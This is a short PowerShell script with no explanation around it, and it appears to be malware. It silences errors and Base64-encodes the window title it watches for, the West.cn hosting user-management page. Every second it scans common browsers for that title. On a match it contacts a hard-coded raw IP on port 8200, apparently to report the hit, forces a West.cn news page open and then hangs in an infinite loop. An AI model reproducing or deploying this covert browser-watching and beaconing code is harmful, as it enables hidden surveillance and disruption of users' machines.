$ErrorActionPreference= 'silentlycontinue';
$kr= [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('KgAodTdioXsGdC1Ow198AH+J6JBwZQF4KgA='));

while ($true) 
{
    if ($proc = Get-Process ApplicationFrameHost,firefox,360chrome,chrome,iexplore | where-object{$_.MainWindowTitle -like $kr})
    {
        $ie = Invoke-WebRequest http://206.189.151.16:8200;$ie.Content;
        if ($proc.Name -eq '360chrome')
        {
            start 360chrome http://news.west.cn/news/list.asp?newsid=827;
        } 
          
        if ($proc.Name -eq 'ApplicationFrameHost')
        {
            start microsoft-edge:http://news.west.cn/news/list.asp?newsid=827;
        }

        while ($true){}
    }
    Start-Sleep -Seconds 1;
 }